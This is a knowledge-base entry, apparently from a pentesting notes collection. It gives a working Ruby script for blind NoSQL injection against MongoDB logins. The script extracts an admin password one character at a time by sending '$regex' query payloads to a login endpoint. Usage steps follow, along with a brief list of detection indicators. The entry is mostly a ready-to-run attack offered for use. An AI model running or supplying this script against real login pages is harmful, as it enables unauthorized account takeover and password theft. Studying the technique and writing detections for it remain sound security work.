---
id: 794716cf-874c-475a-bd03-99150759b22f
type: code
language: Ruby
verified: true
created_at: '2023-04-06T03:56:31.557380+00:00'
updated_at: '2023-04-10T20:23:02.752178+00:00'
tags:
  - blind-nosql
  - brute-force
  - nosql-injection
platforms:
  - Web
validated: true
---

# Ruby-MongoDB-Blind-Injection-Brute-Force

## Code

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```

## Description

This Ruby script implements a blind NoSQL injection brute force for MongoDB logins, using regex to guess password characters via GET requests. It supports custom character sets and persistent HTTP sessions for efficiency.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username | Target username for login | 'admin' |
| url | Full URL of the login endpoint | 'http://example.org/login' |
| CHARSET | Array of characters to brute force | [*'0'..'9',*'a'..'z','-'] |
| GET_EXCLUDE | Array of regex special characters to skip | ['*','+','.','?','|', '#', '&', '$'] |

## Usage

Install httpx gem (gem install httpx), save as a .rb file, customize variables, and run with Ruby. It loops through the CHARSET to build the password based on response matches. Ideal for Ruby-based pentesting tools or environments without Python.

## Detection

- High-frequency GET requests with regex payloads to authentication endpoints.
- Persistent session patterns in web server logs.
- Response analysis for success indicators like 'Yeah' in brute force attempts.
- WAF rules blocking regex injection in query parameters.

## Related

- [[procedures/Blind-NoSQL-Injection-via-Brute-Force]]
